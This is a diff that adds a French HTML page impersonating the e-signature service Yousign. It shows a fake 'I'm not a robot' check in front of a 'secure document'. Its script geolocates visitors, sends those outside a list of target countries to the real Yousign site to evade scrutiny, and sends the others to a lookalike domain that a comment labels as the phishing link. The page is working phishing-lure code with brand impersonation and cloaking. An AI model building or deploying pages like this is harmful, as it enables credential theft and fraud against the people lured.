@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Yousign - Vérification de sécurité</title>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+        background: #e8eaed;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        min-height: 100dvh;
+        margin: 0;
+        color: #1a1a2e;
+        text-align: center;
+        position: relative;
+        padding: 12px;
+    }
+
+    /* Watermark */
+    .bg-watermark {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: min(500px, 80vw);
+        height: auto;
+        opacity: 0.04;
+        z-index: 0;
+        pointer-events: none;
+    }
+
+    .card {
+        background: #ffffff;
+        border-radius: clamp(12px, 2.5vw, 20px);
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+        max-width: 460px;
+        width: 100%;
+        padding: clamp(28px, 6vw, 52px) clamp(20px, 5vw, 44px) clamp(28px, 5vw, 40px);
+        position: relative;
+        z-index: 10;
+        border: 1px solid rgba(0, 0, 0, 0.05);
+    }
+
+    /* Logo */
+    .yousign-logo-header {
+        margin-bottom: clamp(18px, 4vw, 32px);
+    }
+
+    .yousign-logo-header img {
+        height: clamp(28px, 5vw, 42px);
+        width: auto;
+    }
+
+    h1 {
+        font-size: clamp(18px, 4.5vw, 24px);
+        font-weight: 600;
+        margin-bottom: clamp(6px, 1.5vw, 10px);
+        color: #1a1a2e;
+        letter-spacing: -0.3px;
+        line-height: 1.3;
+    }
+
+    .subtitle {
+        font-size: clamp(13px, 3vw, 16px);
+        color: #6b7280;
+        margin-bottom: clamp(20px, 5vw, 30px);
+        line-height: 1.5;
+    }
+
+    /* Sélecteur de langue */
+    .lang-selector {
+        display: flex;
+        gap: 3px;
+        background: #f3f4f6;
+        padding: 3px;
+        border-radius: 10px;
+        margin-bottom: clamp(20px, 5vw, 28px);
+        justify-content: center;
+        border: 1px solid #e5e7eb;
+        flex-wrap: wrap;
+    }
+
+    .lang-btn {
+        padding: clamp(5px, 1.2vw, 8px) clamp(10px, 2.5vw, 18px);
+        border: none;
+        background: transparent;
+        border-radius: 7px;
+        cursor: pointer;
+        font-size: clamp(12px, 2.5vw, 14px);
+        font-weight: 500;
+        transition: all 0.2s ease;
+        color: #6b7280;
+        min-width: 36px;
+        touch-action: manipulation;
+    }
+
+    .lang-btn.active {
+        background: #ffffff;
+        color: #1a1a2e;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+        font-weight: 600;
+    }
+
+    .lang-btn:hover:not(.active) {
+        color: #374151;
+        background: rgba(0, 0, 0, 0.03);
+    }
+
+    /* Barre de sécurité */
+    .security-badge {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: clamp(6px, 1.5vw, 8px);
+        margin-bottom: clamp(18px, 4vw, 24px);
+        font-size: clamp(11px, 2.2vw, 13px);
+        color: #9ca3af;
+    }
+
+    .security-badge svg {
+        width: clamp(12px, 2.5vw, 15px);
+        height: clamp(12px, 2.5vw, 15px);
+        flex-shrink: 0;
+    }
+
+    /* Boîte CAPTCHA */
+    .captcha-box {
+        width: 100%;
+        border: 1px solid #d1d5db;
+        padding: clamp(14px, 3vw, 20px) clamp(14px, 3vw, 20px);
+        border-radius: clamp(8px, 1.8vw, 12px);
+        background: #f9fafb;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        transition: all 0.3s ease;
+        gap: 10px;
+    }
+
+    .captcha-box.blocked {
+        background: #fef2f2 !important;
+        border-color: #fca5a5 !important;
+    }
+
+    .captcha-box.verified {
+        border-color: #86efac;
+        background: #f0fdf4;
+    }
+
+    .left-part {
+        display: flex;
+        align-items: center;
+        gap: clamp(10px, 2.5vw, 16px);
+        flex: 1;
+        min-width: 0;
+    }
+
+    .fake-checkbox {
+        width: clamp(24px, 5.5vw, 32px);
+        height: clamp(24px, 5.5vw, 32px);
+        min-width: clamp(24px, 5.5vw, 32px);
+        border: 2px solid #d1d5db;
+        border-radius: 6px;
+        cursor: pointer;
+        background: white;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: clamp(14px, 3vw, 18px);
+        user-select: none;
+        transition: all 0.15s ease;
+        color: transparent;
+        -webkit-tap-highlight-color: transparent;
+        touch-action: manipulation;
+    }
+
+    .fake-checkbox:hover:not(.checked) {
+        border-color: #6b7280;
+        background: #f9fafb;
+    }
+
+    .fake-checkbox.checked {
+        border-color: #16a34a;
+        background: #dcfce7;
+        color: #16a34a;
+    }
+
+    #checkbox-text {
+        font-size: clamp(13px, 2.8vw, 15px);
+        font-weight: 500;
+        color: #374151;
+        user-select: none;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    .captcha-logo {
+        width: clamp(36px, 8vw, 48px);
+        height: auto;
+        opacity: 0.7;
+        transition: opacity 0.2s;
+        flex-shrink: 0;
+    }
+
+    .captcha-logo:hover {
+        opacity: 0.9;
+    }
+
+    /* Message de blocage */
+    .blocked-message {
+        display: none;
+        margin-top: 12px;
+        padding: clamp(8px, 2vw, 12px) clamp(12px, 2.5vw, 16px);
+        border-radius: 8px;
+        background: #fef2f2;
+        border: 1px solid #fecaca;
+        font-size: clamp(12px, 2.5vw, 14px);
+        color: #b91c1c;
+        animation: fadeIn 0.3s ease;
+        line-height: 1.4;
+    }
+
+    .blocked-message.visible {
+        display: block;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(-4px); }
+        to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Footer */
+    .footer {
+        margin-top: clamp(18px, 4vw, 26px);
+        font-size: clamp(10px, 2vw, 12px);
+        color: #9ca3af;
+        display: flex;
+        justify-content: center;
+        gap: clamp(8px, 2vw, 16px);
+        flex-wrap: wrap;
+    }
+
+    .footer a {
+        color: #6b7280;
+        text-decoration: none;
+    }
+
+    .footer a:hover {
+        color: #374151;
+        text-decoration: underline;
+    }
+
+    /* Loader */
+    .loader {
+        display: inline-block;
+        width: 14px;
+        height: 14px;
+        border: 2px solid #e5e7eb;
+        border-top: 2px solid #6b7280;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+        vertical-align: middle;
+        margin-right: 6px;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    .hidden {
+        display: none !important;
+    }
+</style>
+</head>
+<body>
+
+<!-- Marque d'eau -->
+<img src="https://cdn.yousign.app/logo/logo-soon-to-be.d4617e7c.svg"
+     class="bg-watermark"
+     alt="">
+
+<div class="card">
+
+    <!-- Logo -->
+    <div class="yousign-logo-header">
+        <img src="https://cdn.yousign.app/logo/logo-soon-to-be.d4617e7c.svg"
+             alt="Yousign">
+    </div>
+
+    <h1 id="title">Vérification de sécurité</h1>
+    <p class="subtitle" id="subtitle">Veuillez confirmer que vous êtes un être humain pour accéder au document sécurisé.</p>
+
+    <!-- Langue -->
+    <div class="lang-selector" id="langSelector">
+        <button class="lang-btn" data-lang="fr">FR</button>
+        <button class="lang-btn" data-lang="en">EN</button>
+        <button class="lang-btn" data-lang="de">DE</button>
+        <button class="lang-btn" data-lang="it">IT</button>
+        <button class="lang-btn" data-lang="es">ES</button>
+    </div>
+
+    <!-- Badge sécurité -->
+    <div class="security-badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+        <span>Connexion sécurisée (TLS 1.3)</span>
+    </div>
+
+    <!-- CAPTCHA -->
+    <div class="captcha-box" id="captchaBox">
+        <div class="left-part">
+            <div class="fake-checkbox" id="fakeCheckbox" tabindex="0" role="checkbox" aria-checked="false"> </div>
+            <span id="checkbox-text">Je ne suis pas un robot</span>
+        </div>
+        <img src="https://cdn.yousign.app/logo/logo-soon-to-be.d4617e7c.svg"
+             class="captcha-logo"
+             alt="reCAPTCHA">
+    </div>
+
+    <!-- Blocage -->
+    <div class="blocked-message" id="blockedMessage">
+        ⚠ Accès refusé depuis votre pays. Redirection en cours...
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <a href="https://yousign.com" target="_blank">Yousign</a>
+        <span>&middot;</span>
+        <span>reCAPTCHA</span>
+        <span>&middot;</span>
+        <a href="#" onclick="return false;">Confidentialité</a>
+        <span>&middot;</span>
+        <a href="#" onclick="return false;">Conditions</a>
+    </div>
+</div>
+
+<script>
+const translations = {
+    fr: {
+        title: "Vérification de sécurité",
+        subtitle: "Veuillez confirmer que vous êtes un être humain pour accéder au document sécurisé.",
+        checkbox: "Je ne suis pas un robot",
+        blocked: "Accès refusé depuis votre pays. Redirection en cours..."
+    },
+    en: {
+        title: "Security Verification",
+        subtitle: "Please confirm you are human to access the secure document.",
+        checkbox: "I'm not a robot",
+        blocked: "Access denied from your country. Redirecting..."
+    },
+    de: {
+        title: "Sicherheitsüberprüfung",
+        subtitle: "Bitte bestätigen Sie, dass Sie ein Mensch sind, um auf das gesicherte Dokument zuzugreifen.",
+        checkbox: "Ich bin kein Roboter",
+        blocked: "Zugriff aus Ihrem Land verweigert. Weiterleitung..."
+    },
+    it: {
+        title: "Verifica di sicurezza",
+        subtitle: "Conferma di essere umano per accedere al documento protetto.",
+        checkbox: "Non sono un robot",
+        blocked: "Accesso negato dal tuo paese. Reindirizzamento..."
+    },
+    es: {
+        title: "Verificación de seguridad",
+        subtitle: "Confirma que eres humano para acceder al documento seguro.",
+        checkbox: "No soy un robot",
+        blocked: "Acceso denegado desde tu país. Redirigiendo..."
+    }
+};
+
+let currentLang = 'fr';
+let userCountry = null;
+const authorizedCountries = ['FR', 'BE', 'CH', 'LU', 'MC', 'AT', 'DE'];
+
+// ← TON LIEN DE PHISHING ICI
+const REDIRECT_URL = "https://yousign.merseine.com/fr.html";
+const BLOCKED_REDIRECT_URL = "https://yousign.com/fr-fr";
+
+function updateDisplay() {
+    const t = translations[currentLang];
+    document.getElementById("title").textContent = t.title;
+    document.getElementById("subtitle").textContent = t.subtitle;
+    document.getElementById("checkbox-text").textContent = t.checkbox;
+    document.getElementById("blockedMessage").innerHTML = "⚠ " + t.blocked;
+
+    const captchaBox = document.getElementById("captchaBox");
+    const checkbox = document.getElementById("fakeCheckbox");
+
+    if (userCountry && !authorizedCountries.includes(userCountry)) {
+        captchaBox.classList.add("blocked");
+        checkbox.style.cursor = "not-allowed";
+        checkbox.onclick = null;
+        document.getElementById("blockedMessage").classList.add("visible");
+
+        setTimeout(() => {
+            window.location.href = BLOCKED_REDIRECT_URL;
+        }, 3500);
+    } else {
+        captchaBox.classList.remove("blocked");
+        checkbox.style.cursor = "pointer";
+        checkbox.onclick = function() { toggleCaptcha(checkbox); };
+        document.getElementById("blockedMessage").classList.remove("visible");
+    }
+}
+
+async function detectCountry() {
+    try {
+        const response = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+        const data = await response.json();
+        userCountry = data.country_code;
+
+        const langByCountry = {
+            'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'LU': 'fr', 'MC': 'fr',
+            'DE': 'de', 'AT': 'de',
+            'IT': 'it',
+            'ES': 'es'
+        };
+
+        if (langByCountry[userCountry]) {
+            currentLang = langByCountry[userCountry];
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                btn.classList.toggle('active', btn.dataset.lang === currentLang);
+            });
+        }
+
+        updateDisplay();
+    } catch (error) {
+        document.querySelector('[data-lang="fr"]').classList.add('active');
+        updateDisplay();
+    }
+}
+
+document.getElementById("langSelector").addEventListener('click', function(e) {
+    const btn = e.target.closest('.lang-btn');
+    if (!btn) return;
+
+    document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    currentLang = btn.dataset.lang;
+    updateDisplay();
+});
+
+function toggleCaptcha(box) {
+    if (userCountry && !authorizedCountries.includes(userCountry)) return;
+
+    if (!box.classList.contains("checked")) {
+        box.classList.add("checked");
+        box.textContent = "✓";
+        box.setAttribute('aria-checked', 'true');
+        document.getElementById("captchaBox").classList.add("verified");
+
+        setTimeout(function() {
+            window.location.href = REDIRECT_URL;
+        }, 600);
+    } else {
+        box.classList.remove("checked");
+        box.textContent = "";
+        box.setAttribute('aria-checked', 'false');
+        document.getElementById("captchaBox").classList.remove("verified");
+    }
+}
+
+document.getElementById("fakeCheckbox").addEventListener('click', function() {
+    toggleCaptcha(this);
+});
+
+document.getElementById("fakeCheckbox").addEventListener('keydown', function(e) {
+    if (e.key === ' ' || e.key === 'Enter') {
+        e.preventDefault();
+        toggleCaptcha(this);
+    }
+});
+
+detectCountry();
+</script>
+
+</body>
+</html>
